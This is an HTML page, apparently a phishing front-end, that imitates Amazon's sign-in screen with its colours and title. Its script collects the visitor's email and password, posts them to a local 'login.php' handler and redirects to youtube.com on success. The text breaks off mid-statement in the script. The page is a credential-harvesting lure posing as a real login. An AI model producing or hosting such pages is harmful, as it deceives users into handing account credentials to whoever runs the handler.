<!DOCTYPE html>
<html>
<head>
	<title>Amazon Login</title>
	<style>
		body {
			font-family: Arial, sans-serif;
			background-color: #232f3e;
			color: #fff;
		}

		h1 {
			font-size: 36px;
			margin-top: 50px;
			margin-bottom: 20px;
			text-align: center;
		}

		form {
			width: 400px;
			margin: 0 auto;
			background-color: #fff;
			padding: 20px;
			border-radius: 5px;
		}

		label {
			display: block;
			font-size: 18px;
			margin-bottom: 10px;
		}

		input[type="text"],
		input[type="password"] {
			width: 100%;
			padding: 10px;
			border: none;
			border-radius: 5px;
			margin-bottom: 20px;
			font-size: 18px;
		}

		button {
			background-color: #f90;
			color: #fff;
			border: none;
			border-radius: 5px;
			padding: 10px 20px;
			font-size: 18px;
			cursor: pointer;
		}

		button:hover {
			background-color: #ffaa00;
		}

		.error {
			color: red;
			font-size: 14px;
			margin-top: 10px;
		}
	</style>
</head>
<body>
	<h1>Amazon Login</h1>
	<form id="login-form">
		<label for="email">Email:</label>
		<input type="text" id="email" name="email" required>
		<label for="password">Password:</label>
		<input type="password" id="password" name="password" required>
		<button type="submit">Login</button>
		<div class="error" id="error-message"></div>
	</form>
	<div style="text-align: center; margin-top: 20px;">
		<a href="#" id="create-account-link">Create an account</a>
	</div>
	<form id="create-account-form" style="display: none;">
		<label for="new-email">Email:</label>
		<input type="text" id="new-email" name="email" required>
		<label for="new-password">Password:</label>
		<input type="password" id="new-password" name="password" required>
		<button type="submit">Create Account</button>
		<div class="error" id="create-error-message"></div>
	</form>
	<script>
		document.getElementById('login-form').addEventListener('submit', function(event) {
			event.preventDefault();
			var email = document.getElementById('email').value;
			var password = document.getElementById('password').value;
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
				if (xhr.readyState === 4 && xhr.status === 200) {
					var response = JSON.parse(xhr.responseText);
					if (response.success) {
						window.location.href = 'https://youtube.com';
					} else {
						document.getElementById('error-message').textContent = response.message;
					}
				}
			};
			xhr.open('POST', './login.php');
			xhr.setRequestHeader('Content-Type', 'application/json');
			xhr.send(JSON.stringify({email: email,
